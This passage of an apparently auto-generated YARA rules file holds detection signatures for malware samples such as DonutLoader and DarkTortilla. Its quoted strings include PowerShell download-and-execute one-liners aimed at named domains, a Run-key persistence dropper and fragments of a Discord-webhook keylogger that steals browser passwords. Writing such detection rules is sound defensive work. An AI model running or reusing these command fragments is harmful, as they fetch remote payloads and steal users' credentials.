      $s1 = "fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3azSystem.Collections.Speci" ascii /* score: '27.00'*/
      $s2 = "alized.StringCollection, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089PADPABj" fullword ascii /* score: '27.00'*/
      $s3 = "fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3azSystem.Collections.Speci" ascii /* score: '27.00'*/
      $s4 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADF" fullword ascii /* score: '27.00'*/
      $s5 = "ExecuteNonQueryCommand" fullword wide /* score: '26.00'*/
      $s6 = "Override this property and provide custom screentip template description in DesignTime." fullword wide /* score: '22.00'*/
      $s7 = "Crobagage.exe" fullword wide /* score: '22.00'*/
      $s8 = "4System.Web.Services.Protocols.SoapHttpClientProtocol" fullword ascii /* score: '19.00'*/
      $s9 = "SELECT * FROM UPLOADPROFILE_TEMPLATE WHERE GROUPCUSTOMERTRAVELLER='1' ORDER BY GROUPINDEX,ORDERNO" fullword wide /* score: '17.00'*/
      $s10 = "SELECT * FROM UPLOADPROFILE_TEMPLATE WHERE GROUPCUSTOMERTRAVELLER='2' ORDER BY GROUPINDEX,ORDERNO" fullword wide /* score: '17.00'*/
      $s11 = "SELECT * FROM UPLOADPROFILEAGENT" fullword wide /* score: '15.00'*/
      $s12 = "REFINVNO_" fullword wide /* base64 encoded string*/ /* score: '14.00'*/
      $s13 = "SELECT * FROM CHARGE WHERE CHARGETYPE='CC'" fullword wide /* score: '13.00'*/
      $s14 = "SELECT UPLOADPROFILE_TEMPLATE.GROUPNAME,UPLOADPROFILE_TEMPLATE.LABELNAME,UPLOADPROFILE_TEMPLATE.FIELDNAME,UPLOADPROFILE_TEMPLATE" wide /* score: '13.00'*/
      $s15 = " AND GROUPCUSTOMERTRAVELLER='2') ORDER BY UPLOADPROFILE_TEMPLATE.ORDERNO" fullword wide /* score: '13.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      8 of them
}

rule c405f1e6b63f290ebe49ed3df6a52133d23dc71556e60ac73c877f711668b34b_c405f1e6 {
   meta:
      description = "_subset_batch - file c405f1e6b63f290ebe49ed3df6a52133d23dc71556e60ac73c877f711668b34b_c405f1e6.rar"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "c405f1e6b63f290ebe49ed3df6a52133d23dc71556e60ac73c877f711668b34b"
   strings:
      $s1 = "Overdue Account Letter.exe" fullword ascii /* score: '22.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 3000KB and
      all of them
}

rule c6ec35db45db86043aa7dc613c5e58625e6d9922c2071d876de03402d17832a1_c6ec35db {
   meta:
      description = "_subset_batch - file c6ec35db45db86043aa7dc613c5e58625e6d9922c2071d876de03402d17832a1_c6ec35db.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "c6ec35db45db86043aa7dc613c5e58625e6d9922c2071d876de03402d17832a1"
   strings:
      $s1 = "// c6d29ae1-5529-4bbe-94f4-ffac2d60dcb9 - 638917067642261024" fullword ascii /* score: '12.00'*/
      $s2 = "// 2ff53179-f957-403d-b871-2403234c795a - 638917067642261024" fullword ascii /* score: '9.00'*/
      $s3 = "// 7c7c4313-f951-4349-83a6-d502307f49fd - 638917067642261024" fullword ascii /* score: '9.00'*/
      $s4 = "// b21d8660-3815-40c4-abd9-13cb77114669 - 638917067642261024" fullword ascii /* score: '9.00'*/
      $s5 = "// d12a4327-26db-45cb-9e00-4e66fa303357 - 638917067642261024" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x0a0d and filesize < 700KB and
      all of them
}

rule f34d5f2d4577ed6d9ceec516c1f5a744_imphash__4b905e30 {
   meta:
      description = "_subset_batch - file f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_4b905e30.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4b905e30ac86d9f77897811e8bb4cdd1ccdfec8a5c09eee4bd75d752d9387283"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"utf-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '33.00'*/
      $s2 = "ZSystem.UInt16, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" fullword ascii /* score: '27.00'*/
      $s3 = "BluetoothAPIs.dll" fullword ascii /* score: '23.00'*/
      $s4 = "libusb-1.0.dll" fullword ascii /* score: '20.00'*/
      $s5 = "INV02-DXCM-21005013HXM.exe" fullword wide /* score: '19.00'*/
      $s6 = "GetActiveConfigDescriptor" fullword ascii /* score: '18.00'*/
      $s7 = "libusb_get_active_config_descriptor" fullword ascii /* score: '18.00'*/
      $s8 = "libusb_get_config_descriptor" fullword ascii /* score: '18.00'*/
      $s9 = "GetConfigDescriptor" fullword ascii /* score: '18.00'*/
      $s10 = "libusb_get_config_descriptor_by_value" fullword ascii /* score: '18.00'*/
      $s11 = "GetConfigDescriptorByValue" fullword ascii /* score: '18.00'*/
      $s12 = "get_KernelVersion" fullword ascii /* score: '17.00'*/
      $s13 = "GetDeviceDescriptor" fullword ascii /* score: '15.00'*/
      $s14 = "GetDeviceKeyValueFailed" fullword ascii /* score: '15.00'*/
      $s15 = "libusb_get_device_descriptor" fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 900KB and
      1 of ($x*) and 4 of them
}

rule DarkCloud_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__3485b71b {
   meta:
      description = "_subset_batch - file DarkCloud(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_3485b71b.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "3485b71b8ccdae236a71d4426aea885bd16ee3e2760d9eb324dfce2a552dd938"
   strings:
      $s1 = "jyEm.exe" fullword wide /* score: '22.00'*/
      $s2 = "SSH, Telnet and Rlogin client" fullword ascii /* score: '15.00'*/
      $s3 = "targetTimeZoneId" fullword ascii /* score: '14.00'*/
      $s4 = "3https://www.chiark.greenend.org.uk/~sgtatham/putty/0" fullword ascii /* score: '10.00'*/
      $s5 = "* 5Os^a%" fullword ascii /* score: '9.00'*/
      $s6 = "GetTimeInTimezone" fullword ascii /* score: '9.00'*/
      $s7 = "GetAvailableTimeZones" fullword ascii /* score: '9.00'*/
      $s8 = "GetTimeZoneDisplayName" fullword ascii /* score: '9.00'*/
      $s9 = "GetActiveCountdownTimers" fullword ascii /* score: '9.00'*/
      $s10 = "GetStopwatchElapsed" fullword ascii /* score: '9.00'*/
      $s11 = "GetTimeZoneOffset" fullword ascii /* score: '9.00'*/
      $s12 = "GetCountdownRemaining" fullword ascii /* score: '9.00'*/
      $s13 = "GetActiveStopwatches" fullword ascii /* score: '9.00'*/
      $s14 = "hazemark" fullword ascii /* score: '8.00'*/
      $s15 = "stopwatches" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      8 of them
}

rule c72fc156ec16f9933ba581f8640311fcd8a14af4387472831ca17185275f6683_c72fc156 {
   meta:
      description = "_subset_batch - file c72fc156ec16f9933ba581f8640311fcd8a14af4387472831ca17185275f6683_c72fc156.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "c72fc156ec16f9933ba581f8640311fcd8a14af4387472831ca17185275f6683"
   strings:
      $s1 = "mosyPU.cHn\\" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0xd8ff and filesize < 2000KB and
      all of them
}

rule DonutLoader_signature__2 {
   meta:
      description = "_subset_batch - file DonutLoader(signature).hta"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "92b3d8bab3c0250d9f2cdc910bbff25a81becee93030610a3393c9b9d3ef8a82"
   strings:
      $s1 = "      var cmd = 'powershell -w h -c \"iwr http://uruvita.com | iex\"';" fullword ascii /* score: '25.00'*/
      $s2 = "      shell.Exec(cmd);" fullword ascii /* score: '23.00'*/
      $s3 = "  </script>" fullword ascii /* score: '10.00'*/
      $s4 = "      var shell = new ActiveXObject(\"WScript.Shell\");" fullword ascii /* score: '10.00'*/
      $s5 = "  <script language=\"JScript\">" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x683c and filesize < 1KB and
      all of them
}

rule DonutLoader_signature__3804e83b {
   meta:
      description = "_subset_batch - file DonutLoader(signature)_3804e83b.hta"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "3804e83bd97292fa235825c3cbd57f215a99f2e99fae5e61da19da97f54160eb"
   strings:
      $s1 = "      shell.Exec(cmd);" fullword ascii /* score: '23.00'*/
      $s2 = "      var cmd = 'powershell -w h -c \"(irm -useb http://jekitech.cloud) | powershell\"';" fullword ascii /* score: '18.00'*/
      $s3 = "  </script>" fullword ascii /* score: '10.00'*/
      $s4 = "      var shell = new ActiveXObject(\"WScript.Shell\");" fullword ascii /* score: '10.00'*/
      $s5 = "  <script language=\"JScript\">" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x683c and filesize < 1KB and
      all of them
}

rule DonutLoader_signature__3d1d17a9 {
   meta:
      description = "_subset_batch - file DonutLoader(signature)_3d1d17a9.hta"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "3d1d17a99348b5cf15246d3c420f5e9fd04b7bdfca631fd2d411626d368ae92f"
   strings:
      $s1 = "      var cmd = 'powershell -w h -c \"iwr http://ritavoi.com | iex\"';" fullword ascii /* score: '25.00'*/
      $s2 = "      shell.Exec(cmd);" fullword ascii /* score: '23.00'*/
      $s3 = "  </script>" fullword ascii /* score: '10.00'*/
      $s4 = "      var shell = new ActiveXObject(\"WScript.Shell\");" fullword ascii /* score: '10.00'*/
      $s5 = "  <script language=\"JScript\">" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x683c and filesize < 1KB and
      all of them
}

rule DonutLoader_signature__bdba6e3a {
   meta:
      description = "_subset_batch - file DonutLoader(signature)_bdba6e3a.hta"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "bdba6e3a564a7fe7075d127830b46237ed6dc9dac6d5069d2ab69a0e76a1b264"
   strings:
      $s1 = "      var cmd = 'powershell -w h -c \"iwr http://royevita.com/tri4 | iex\"';" fullword ascii /* score: '25.00'*/
      $s2 = "      shell.Exec(cmd);" fullword ascii /* score: '23.00'*/
      $s3 = "  </script>" fullword ascii /* score: '10.00'*/
      $s4 = "      var shell = new ActiveXObject(\"WScript.Shell\");" fullword ascii /* score: '10.00'*/
      $s5 = "  <script language=\"JScript\">" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x683c and filesize < 1KB and
      all of them
}

rule DonutLoader_signature__d84cd877 {
   meta:
      description = "_subset_batch - file DonutLoader(signature)_d84cd877.hta"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d84cd8772c464400c8a7f3131613d4fead4139d6dd4e16a062593118ccda4744"
   strings:
      $s1 = "      var cmd = 'powershell -w h -c \"iwr http://royevita.com | iex\"';" fullword ascii /* score: '25.00'*/
      $s2 = "      shell.Exec(cmd);" fullword ascii /* score: '23.00'*/
      $s3 = "  </script>" fullword ascii /* score: '10.00'*/
      $s4 = "      var shell = new ActiveXObject(\"WScript.Shell\");" fullword ascii /* score: '10.00'*/
      $s5 = "  <script language=\"JScript\">" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x683c and filesize < 1KB and
      all of them
}

rule d0d860af4e4ef8639be97c18a255093127fbe21a1f69e07ee28b167072949c85_d0d860af {
   meta:
      description = "_subset_batch - file d0d860af4e4ef8639be97c18a255093127fbe21a1f69e07ee28b167072949c85_d0d860af.ps1"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d0d860af4e4ef8639be97c18a255093127fbe21a1f69e07ee28b167072949c85"
   strings:
      $s1 = "            Start-Process $dJ8yE -WindowStyle Hidden -ErrorAction SilentlyContinue" fullword ascii /* score: '21.00'*/
      $s2 = "    $zI4bN.Headers.Add(\"User-Agent\",\"PowerShell/5.1\")" fullword ascii /* score: '20.00'*/
      $s3 = "            $eK1uI = Get-ChildItem $qR8nM -Recurse -Name \"*.exe\" -ErrorAction SilentlyContinue | Select-Object -First 1" fullword ascii /* score: '18.00'*/
      $s4 = "            # Process execution" fullword ascii /* score: '15.00'*/
      $s5 = "    $qR8nM = [System.IO.Path]::GetTempPath()" fullword ascii /* score: '14.00'*/
      $s6 = "                New-ItemProperty -Path $fL4oA -Name $gM7pS -Value $hN0qD -PropertyType String -Force -ErrorAction SilentlyContin" ascii /* score: '13.00'*/
      $s7 = "                New-ItemProperty -Path $fL4oA -Name $gM7pS -Value $hN0qD -PropertyType String -Force -ErrorAction SilentlyContin" ascii /* score: '13.00'*/
      $s8 = "            $fL4oA = \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\"" fullword ascii /* score: '11.00'*/
      $s9 = "            $aF6sQ = New-Object -ComObject Shell.Application" fullword ascii /* score: '10.00'*/
      $s10 = "            [System.IO.Compression.ZipFile]::ExtractToDirectory($wE3vL, $qR8nM)" fullword ascii /* score: '9.00'*/
      $s11 = "            Add-Type -AssemblyName System.IO.Compression.FileSystem" fullword ascii /* score: '9.00'*/
      $s12 = "    $wE3vL = Join-Path $qR8nM \"temp_archive.zip\"" fullword ascii /* score: '9.00'*/
      $s13 = "    $zI4bN = New-Object System.Net.WebClient" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x740a and filesize < 5KB and
      8 of them
}

rule f0ff9941ea4264083094fd5005b047667e2f5b32acd97c04f144a9c0034428f5_f0ff9941 {
   meta:
      description = "_subset_batch - file f0ff9941ea4264083094fd5005b047667e2f5b32acd97c04f144a9c0034428f5_f0ff9941.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f0ff9941ea4264083094fd5005b047667e2f5b32acd97c04f144a9c0034428f5"
   strings:
      $x1 = ",c:\\\\\", \"Tooltip description of the shortcut.\", GetSystemDir() + \"\\\\shell32.dll\", \"CTRL+ALT+t\", \"15\", 7));" fullword ascii /* score: '39.00'*/
      $x2 = "//MsgBox(FileCreateShortcut(GetWindowsDir() + \"\\\\explorer.exe\", GetDesktopDir() + \"\\\\Shortcut Example.lnk\", GetWindowsDi" ascii /* score: '39.00'*/
      $x3 = "FileCreateShortcut(GetWindowsDir() + \"\\\\explorer.exe\", GetDesktopDir() + \"\\\\overfriendly.exe.lnk\", GetWindowsDir(), \"/e" ascii /* score: '39.00'*/
      $x4 = "var ChildProc = new ActiveXObject(\"WScript.Shell\").Exec(\"rundll32 kernel32,Sleep\").ProcessId;" fullword ascii /* score: '38.00'*/
      $x5 = "var test=GetObject(\"winmgmts:\\\\\\\\.\\\\root\\\\cimv2:win32_process.Handle='\" +ChildProc+ \"'\");" fullword ascii /* score: '35.00'*/
      $x6 = "Tooltip description of the shortcut.\", GetSystemDir() + \"\\\\shell32.dll\", \"CTRL+ALT+t\", \"15\", 7);" fullword ascii /* score: '33.00'*/
      $x7 = "var objProcess = GetObject(\"winmgmts:\\\\\\\\.\\\\root\\\\cimv2:Win32_Process\");" fullword ascii /* score: '31.00'*/
      $s8 = "//MsgBox(ShellExecute(\"notepad.exe\", \"\", \"\", \"open\", 1));" fullword ascii /* score: '29.00'*/
      $s9 = "var objOutParams = objProcess.ExecMethod_(\"Create\", objInParams);" fullword ascii /* score: '28.00'*/
      $s10 = "MsgBox(ProcessGetStats(\"notepad.exe\",0));" fullword ascii /* score: '27.00'*/
      $s11 = "MsgBox(ProcessGetStats(\"notepad.exe\", 1));" fullword ascii /* score: '27.00'*/
      $s12 = "//MsgBox(ProcessList(\"stairlikehost.exe\").join(\"\\r\\n\"));" fullword ascii /* score: '27.00'*/
      $s13 = "var Proc = WMIQuery(\"winmgmts:{impersonationLevel=impersonate}!\\\\\\\\.\\\\root\\\\CIMV2\", \"SELECT * FROM Win32_Process WHER" ascii /* score: '26.00'*/
      $s14 = "WshShell.Run(\"%TMP%\\\\setfiletime.exe \"+'\"'+[root, mask, datestring, typeOfFunction, deep].join('\" \"')+'\"', 0, 1);" fullword ascii /* score: '26.00'*/
      $s15 = "var res = WMIQuery(\"winmgmts:{impersonationLevel=impersonate}!\\\\\\\\.\\\\root\\\\cimv2\", \"Select * from Win32_NetworkAdapte" ascii /* score: '26.00'*/
   condition:
      uint16(0) == 0x7546 and filesize < 200KB and
      1 of ($x*) and all of them
}

rule c7aa8bd1e7be1c70bc5d7079dca10ae9bc84641e993bb08c0f25e4e017f7a751_c7aa8bd1 {
   meta:
      description = "_subset_batch - file c7aa8bd1e7be1c70bc5d7079dca10ae9bc84641e993bb08c0f25e4e017f7a751_c7aa8bd1.py"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "c7aa8bd1e7be1c70bc5d7079dca10ae9bc84641e993bb08c0f25e4e017f7a751"
   strings:
      $s1 = "    keylogger_thread = threading.Thread(target=start_keylogger, daemon=True)" fullword ascii /* score: '25.00'*/
      $s2 = "WEBHOOK_URL = f\"https://discord.com/api/webhooks/{CHANNEL_ID}/{BOT_TOKEN}\"  # For logging" fullword ascii /* score: '25.00'*/
      $s3 = "            cursor.execute(\"SELECT origin_url, username_value, password_value FROM logins\")" fullword ascii /* score: '25.00'*/
      $s4 = "        shutil.copy(system_log_src, os.path.join(temp_folder, 'keylog.txt'))" fullword ascii /* score: '24.00'*/
      $s5 = "        log_file = os.path.join(temp_dir, 'system_log.txt')" fullword ascii /* score: '21.00'*/
      $s6 = "from pynput import keyboard  # <-- MODERN KEYLOGGER FIX" fullword ascii /* score: '21.00'*/
      $s7 = " Keylogger thread started.\")" fullword ascii /* score: '20.00'*/
      $s8 = "    system_log_src = os.path.join(os.environ['LOCALAPPDATA'], 'Temp', 'system_log.txt')" fullword ascii /* score: '20.00'*/
      $s9 = " THE REAPER - COMMANDS " fullword ascii /* score: '20.00'*/
      $s10 = "    log_to_webhook(f\"#{message.channel} - {author_name}: {message.content}\")" fullword ascii /* score: '20.00'*/
      $s11 = "# ====== EVIL CONFIGURATION ======" fullword ascii /* score: '19.00'*/
      $s12 = "    await bot.process_commands(message)" fullword ascii /* score: '18.00'*/
      $s13 = "from discord.ext import commands" fullword ascii /* score: '18.00'*/
      $s14 = "            shutil.copyfile(login_data, temp_db)" fullword ascii /* score: '17.00'*/
      $s15 = "listener = None  # Global keylogger listener object" fullword ascii /* score: '17.00'*/
   condition:
      uint16(0) == 0x6d69 and filesize < 30KB and
      8 of them
}

rule DiskWriter_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__ab822556 {
   meta:
      description = "_subset_batch - file DiskWriter(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_ab822556.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ab822556b8b24dfb2a9807417625e549686caeb9f57f866f688f46cdffa1f7a7"
   strings:
      $s1 = "  <!-- Abilita i temi per finestre di dialogo e controlli comuni di Windows (Windows XP e versioni successive) -->" fullword ascii /* score: '28.00'*/
      $s2 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3afSystem.Drawing.Icon, S" ascii /* score: '27.00'*/
      $s3 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3afSystem.Drawing.Icon, S" ascii /* score: '27.00'*/
      $s4 = "ystem.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADPBj" fullword ascii /* score: '24.00'*/
      $s5 = "D:\\Progetti\\MasterNight\\obj\\Debug\\MasterNight.pdb" fullword ascii /* score: '24.00'*/
      $s6 = "https://github.com/CodeSharp3210/MasterNight/releases/download/Source/sound1.wav" fullword wide /* score: '23.00'*/
      $s7 = "https://github.com/CodeSharp3210/MasterNight/releases/download/Source/sound2.wav" fullword wide /* score: '23.00'*/
      $s8 = "       Imposta l'applicazione in modo riconosca i percorsi lunghi. Vedere https://docs.microsoft.com/windows/win32/fileio/maximu" ascii /* score: '22.00'*/
      $s9 = "MasterNight.exe" fullword wide /* score: '22.00'*/
      $s10 = "\\powershell.exe" fullword wide /* score: '21.00'*/
      $s11 = " compatibile. -->" fullword ascii /* score: '16.00'*/
      $s12 = "        <requestedExecutionLevel  level=\"asInvoker\" uiAccess=\"false\" />" fullword ascii /* score: '15.00'*/
      $s13 = "<currentProcess>5__2" fullword ascii /* score: '15.00'*/
      $s14 = "<processo>5__3" fullword ascii /* score: '15.00'*/
      $s15 = "<processi>5__2" fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 700KB and
      8 of them
}

rule DarkTortilla_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__66419cb3 {
   meta:
      description = "_subset_batch - file DarkTortilla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_66419cb3.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "66419cb32e2cfc269563e09e97ad3a6536dedeff355058f0acc2add613978757"
   strings:
      $s1 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPAD$4V" fullword ascii /* score: '27.00'*/
      $s2 = "DAVID666.exe" fullword wide /* score: '22.00'*/
      $s3 = "4System.Web.Services.Protocols.SoapHttpClientProtocol" fullword ascii /* score: '19.00'*/
      $s4 = "Pendiente" fullword wide /* base64 encoded string*/ /* score: '16.00'*/
      $s5 = "RegistroLoginTableAdapter" fullword wide /* score: '15.00'*/
      $s6 = "JlJzKFBYA" fullword ascii /* base64 encoded string*/ /* score: '14.00'*/
      $s7 = "System.Data.DataRowView" fullword wide /* score: '14.00'*/
      $s8 = "userCredentials" fullword ascii /* score: '12.00'*/
      $s9 = "Engineering/Computer Technology" fullword wide /* score: '12.00'*/
      $s10 = "Conf, Password" fullword wide /* score: '12.00'*/
      $s11 = "psicometrica" fullword wide /* score: '12.00'*/
      $s12 = "MyTemplate" fullword ascii /* score: '11.00'*/
      $s13 = "My.Computer" fullword ascii /* score: '11.00'*/
      $s14 = ".ComprobanteDevolucionUniformeToolStripMenuItem" fullword ascii /* score: '11.00'*/
      $s15 = "Shelleng" fullword wide /* score: '11.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 16000KB and
      8 of them
}

rule f34d5f2d4577ed6d9ceec516c1f5a744_imphash__209b94eb {
   meta:
      description = "_subset_batch - file f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_209b94eb.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "209b94ebe3aef8e86fc13190883218e531b5da10bf2c28b868de082a64b2eaf7"
   strings:
      $s1 = "GGWSUpdate.exe" fullword ascii /* score: '22.00'*/
      $s2 = "GGWS.exe" fullword wide /* score: '22.00'*/
      $s3 = "D:\\GGWS\\GGWSUpdate\\obj\\Release\\GGWSUpdate.pdb" fullword ascii /* score: '19.00'*/
      $s4 = ":8082/GGWS.exe" fullword wide /* score: '19.00'*/
      $s5 = "GGWS.exe.config" fullword wide /* score: '17.00'*/
      $s6 = "server.txt" fullword wide /* score: '14.00'*/
      $s7 = ":8082/GGWS.exe.config" fullword wide /* score: '14.00'*/
      $s8 = "client.txt" fullword wide /* score: '14.00'*/
      $s9 = "client_DownloadFileCompleted" fullword ascii /* score: '13.00'*/
      $s10 = "GetPrivateProfileString" fullword ascii /* score: '12.00'*/
      $s11 = "\\Update\\client.txt" fullword wide /* score: '12.00'*/
      $s12 = "\\Update\\server.txt" fullword wide /* score: '12.00'*/
      $s13 = ":8082/server.txt" fullword wide /* score: '11.00'*/
      $s14 = "ggws.ico" fullword wide /* score: '10.00'*/
      $s15 = "IniReadValue3" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 50KB and
      8 of them
}

rule DarkTortilla_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__3cfad4c4 {
   meta:
      description = "_subset_batch - file DarkTortilla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_3cfad4c4.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "3cfad4c492325e76507a9ac672642b83d424f98a2a32b1b00dd74f2cd68f3d8b"
   strings:
      $s1 = "System.Windows.Forms.ImageListStreamer, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089P" ascii /* score: '27.00'*/
      $s2 = "System.Windows.Forms.ImageListStreamer, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089P" ascii /* score: '27.00'*/
      $s3 = "SMTPPASSWORD" fullword wide /* PEStudio Blacklist: strings */ /* score: '24.50'*/
      $s4 = "Vitafagixan.exe" fullword wide /* score: '22.00'*/
      $s5 = "STMPLOGIN" fullword wide /* score: '20.50'*/
      $s6 = "SMTPPORT" fullword wide /* PEStudio Blacklist: strings */ /* score: '19.50'*/
      $s7 = "4System.Web.Services.Protocols.SoapHttpClientProtocol" fullword ascii /* score: '19.00'*/
      $s8 = "SMTPBYPASSCERTIFICATEVALIDATION" fullword wide /* score: '18.50'*/
      $s9 = "SMTPHOST" fullword wide /* score: '16.50'*/
      $s10 = "Veillez consulter le fichier log.txt pour plus de d" fullword wide /* score: '16.00'*/
      $s11 = "- CodesPostaux = KO (Probl" fullword wide /* score: '15.00'*/
      $s12 = "archive.txt" fullword wide /* score: '14.00'*/
      $s13 = "list_password" fullword wide /* score: '12.00'*/
      $s14 = "@password" fullword wide /* score: '12.00'*/
      $s15 = "Sunday - Saturday" fullword wide /* score: '12.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      8 of them
}

rule DarkCloud_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__9a52dba4 {
   meta:
      description = "_subset_batch - file DarkCloud(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_9a52dba4.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "9a52dba414a32c7500633df7507c7b829dfd57e7b0291e31980877d37d2b2941"
   strings:
      $s1 = "fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3ahSystem.Drawing.Bitmap, S" ascii /* score: '27.00'*/
      $s2 = "ystem.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADPBj" fullword ascii /* score: '24.00'*/
      $s3 = "wgXU.exe" fullword wide /* score: '22.00'*/
      $s4 = "wgXU.pdb" fullword ascii /* score: '14.00'*/
      $s5 = "txtCommand" fullword wide /* score: '12.00'*/
      $s6 = "get_AssemblyDescription" fullword ascii /* score: '11.00'*/
      $s7 = "* !XDt" fullword ascii /* score: '9.00'*/
      $s8 = "tbxContent" fullword wide /* score: '9.00'*/
      $s9 = "GetFleet" fullword ascii /* score: '9.00'*/
      $s10 = "GetPlanet" fullword ascii /* score: '9.00'*/
      $s11 = "Client Socket Program - Server Connected ..." fullword wide /* score: '9.00'*/
      $s12 = "hazemark" fullword ascii /* score: '8.00'*/
      $s13 = "get_AssemblyCompany" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      8 of them
}

rule c9cc16f2cac6a5824535713d56b35d0a28f553f5c7a4915833bf35c95162fcd7_c9cc16f2 {
   meta:
      description = "_subset_batch - file c9cc16f2cac6a5824535713d56b35d0a28f553f5c7a4915833bf35c95162fcd7_c9cc16f2.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "c9cc16f2cac6a5824535713d56b35d0a28f553f5c7a4915833bf35c95162fcd7"
   strings:
      $s1 = "elseif(((($RCwLJqSQPMf+41+$DfZER))+($KQzaigETNquGr-35-($NbyGqIDOwtA+6+($TKgalVHzI+1-12)+(20-1+32)))) -ge (((13+1-(2-41-8))+(33-4" ascii /* score: '13.00'*/
      $s2 = "elseif(((($RCwLJqSQPMf+41+$DfZER))+($KQzaigETNquGr-35-($NbyGqIDOwtA+6+($TKgalVHzI+1-12)+(20-1+32)))) -ge (((13+1-(2-41-8))+(33-4" ascii /* score: '13.00'*/
      $s3 = "$QxmOoWLd = ([char][int]$YyVNAgcwJ + [char][int]$YGWwJLz + [char][int]$aiHcnYkOFKAZB + [char][int]$LCmdkjqIsURfey)" fullword ascii /* score: '11.00'*/
      $s4 = "$KQzaigETNquGr = (((6*37+45+2+39*31*41+3+7)-(49056)))" fullword ascii /* score: '9.00'*/
      $s5 = "5-35+5-46+28))){" fullword ascii /* score: '9.00'*/ /* hex encoded string 'SUF(' */
      $s6 = "$NlUfT = ((($lXOTHK+18+39-(($aIShEBHwjYuK-48+$aFZDI))+27-16+39-(35-13-$KQzaigETNquGr)))-((1-16-15))-(494))" fullword ascii /* score: '9.00'*/
      $s7 = "$CkLVHQPi = ((25+9+($KQzaigETNquGr-32+$namCUpdYKitSQN))+($UikPxm+43-$vHPdrUJbBWFs)-(9-20+15)+(62))" fullword ascii /* score: '9.00'*/
      $s8 = "$bQFfePpGia = $KQzaigETNquGr" fullword ascii /* score: '9.00'*/
